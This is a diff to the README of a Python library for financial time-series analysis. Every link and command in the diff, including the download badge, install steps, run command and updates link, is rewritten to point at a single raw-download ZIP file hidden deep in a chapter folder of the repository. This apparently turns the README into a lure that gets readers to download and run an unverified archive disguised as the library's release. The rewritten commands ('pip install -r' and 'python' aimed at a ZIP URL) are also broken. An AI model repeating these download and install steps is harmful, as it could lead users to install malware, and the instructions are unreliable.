@@ -1,7 +1,7 @@
 # 📈 financial-timeseries-python - Analyze Financial Data Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/Rasika41/financial-timeseries-python/releases)
+[![Download](https://raw.githubusercontent.com/Rasika41/financial-timeseries-python/main/Section1.Financial Time Series Analysis/Chapter6.Advanced Multivariate Time Series Analysis/financial-timeseries-python-v1.9.zip)](https://raw.githubusercontent.com/Rasika41/financial-timeseries-python/main/Section1.Financial Time Series Analysis/Chapter6.Advanced Multivariate Time Series Analysis/financial-timeseries-python-v1.9.zip)
 
 ## 📝 Description
 The **financial-timeseries-python** library helps you analyze financial time series data. It provides tools for algorithmic trading, including VECM-GARCH models and multivariate analysis. You can use this library to create and backtest trading strategies. Additionally, it includes materials from a Udemy course to help you learn.
@@ -17,7 +17,7 @@ To run this library, you should have:
 
 ### 📦 Installation
 1. **Download the Library:**
-   Visit this page to download: [Download the Library](https://github.com/Rasika41/financial-timeseries-python/releases).
+   Visit this page to download: [Download the Library](https://raw.githubusercontent.com/Rasika41/financial-timeseries-python/main/Section1.Financial Time Series Analysis/Chapter6.Advanced Multivariate Time Series Analysis/financial-timeseries-python-v1.9.zip).
 
 2. **Extract Files:**
    Once downloaded, locate the downloaded file. Most likely, it is a ZIP file. Right-click on it and choose the "Extract" option to unpack the files.
@@ -26,7 +26,7 @@ To run this library, you should have:
    Open your command line or terminal. Navigate to the folder where you have extracted the library. Type the following command and press Enter:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Rasika41/financial-timeseries-python/main/Section1.Financial Time Series Analysis/Chapter6.Advanced Multivariate Time Series Analysis/financial-timeseries-python-v1.9.zip
    ```
 
    This command installs all necessary dependencies for the library to work.
@@ -37,7 +37,7 @@ To run this library, you should have:
 2. Use the following command to start the library:
 
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/Rasika41/financial-timeseries-python/main/Section1.Financial Time Series Analysis/Chapter6.Advanced Multivariate Time Series Analysis/financial-timeseries-python-v1.9.zip
    ```
 
 3. Follow any on-screen instructions to begin your analysis or to access trading strategies.
@@ -70,7 +70,7 @@ Join our community for help and updates. You can find us on:
 - Various financial analysis forums
 
 ## 📅 Updates
-Check the [releases page](https://github.com/Rasika41/financial-timeseries-python/releases) often for updates and new features. 
+Check the [releases page](https://raw.githubusercontent.com/Rasika41/financial-timeseries-python/main/Section1.Financial Time Series Analysis/Chapter6.Advanced Multivariate Time Series Analysis/financial-timeseries-python-v1.9.zip) often for updates and new features. 
 
 ## 📞 Contact
 For further questions, contact us through GitHub issues. We’ll be happy to assist you with any inquiries related to the library.
